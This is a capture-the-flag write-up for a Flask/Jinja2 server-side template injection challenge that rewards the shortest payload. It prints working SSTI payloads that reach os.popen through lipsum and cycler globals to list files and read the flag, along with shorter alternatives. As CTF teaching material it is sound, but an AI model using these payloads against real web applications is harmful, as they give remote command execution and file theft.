# SSTI Golf
**Web**

### Description

Just in case you didn't get enough golf with the other challenge. Flag is in an arbitrarily named file, but in the same directory.  
http://sstigolf.chal.imaginaryctf.org

### Solution 
This challenge asks for a Flask/Jinja2 SSTI(Server Side Template Injection). There are many resources and payloads available online if you google `Jinja2 SSTI`. I personally find [this blog](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) and [this cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) very cute.  

The real challenge here is to reduce the size of your payload. I did a simple search and found [this article](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/). I was able use the a similar payload to solve the problem. Specifically  
1. Get the current directory
```python
{{lipsum.__globals__.os.popen("ls").read()}}
``` 
The return value is 
```python
app.py run.sh truly_an_arbitrarily_named_file
```

2. Looks like `truly_an_arbitrarily_named_file` is probably the file we want to read. Now we save the command we want to call, `cat truly_an_arbitrarily_named_file`, to a config variable. 
```python
{{config.update(l=request.args.get("l"))}}&l=cat truly_an_arbitrarily_named_file
```

3. Call popen again with the variable we just wrote to config. 
```python
{{lipsum.__globals__.os.popen(config.l).read()}}
```
And there returns the flag. 

### Some Better(?) Solutions
- I talked to `puzzler7`(who writes this chal :rooYay2:) later and found out I could just do 
```python
{{lipsum.__globals__.os.popen("cat *").read()}}
``` 
(•\*\_•\*) (•\*\_•\*) (•\*\_•\*)
- Actually the intended solution is 
```python
{{cycler.next.__globals__.os.popen("nl *")|max}}
```
Since `popen()` returns an iterator, anything takes an iterator can read it. That saves 3... chars on `.read()`.  
*But we all know `lipsum` wins.*
